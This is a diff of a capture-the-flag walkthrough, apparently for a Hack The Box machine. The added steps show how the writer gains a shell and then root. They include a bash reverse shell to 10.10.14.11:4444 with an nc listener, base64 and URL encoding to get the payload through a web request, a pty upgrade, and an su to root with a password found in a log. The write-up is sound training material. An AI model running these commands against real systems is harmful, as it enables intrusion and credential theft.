@@ -243,5 +243,23 @@ class Settings(BaseSettings):
 - Now we just need to copy the new token and we should be able to execute commands.
 - Let's try our ls again. And it works!
 ![image](https://user-images.githubusercontent.com/96747355/168401140-a62a8608-2bae-453e-9c06-991a023b37ef.png)  
-
+- Let's try to get a shell `bash -i >& /dev/tcp/10.10.14.11/4444 0>&1`. 
+- We launch a listener `nc -lvp 4444`
+- We have to be careful with the & symbol in order for it to not be interpreted as url char. so first lets encode this in base64 we can do it with burp  
+![image](https://user-images.githubusercontent.com/96747355/168448294-d83f5a86-f40e-4340-9e3c-a7dde3b74a49.png)  
+- Now we need to add an echo -n in front of it pipe it to a base64 decode and pipe it to bash so that it gets executed like this  
+![image](https://user-images.githubusercontent.com/96747355/168448348-1a2ceaab-2418-491b-b8fb-f0d23c19695a.png)  
+- And finally we fully urlencode all of this with burp again we have ti select "URL-encode all characters"  
+![image](https://user-images.githubusercontent.com/96747355/168448399-79c814d0-41f8-4558-9d8b-4c84dfc4456a.png)  
+- Our payload will look like this  
+![image](https://user-images.githubusercontent.com/96747355/168448426-e5f57283-24d3-46c7-afc0-f6ee18cad173.png)  
+- We get a shell!  
+![image](https://user-images.githubusercontent.com/96747355/168448481-9b9136f4-fe34-40fc-9956-60de35ad0cf5.png)  
+- in the folder we arrive (`/home/htb/uhc`) we have an auth.log file that is interesting because of something that looks like a password:  
+![image](https://user-images.githubusercontent.com/96747355/168448522-18989ac7-5f9a-4ec1-b067-42d6ba29c5a4.png)  
+- let's try to see if we can use it to get root
+- We need to stabilize our shell first we can use [this doc](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to do so. so we just need to type `python -c 'import pty; pty.spawn("/bin/bash")'`
+- And now we just need to try to login as root using `su root` and it works!!  
+![image](https://user-images.githubusercontent.com/96747355/168448621-b3e76bac-8793-41f7-a4e0-134406f12d1a.png)  
+- We can finally grab the root flag!! :D :D :D `cat /root/root.txt`
 
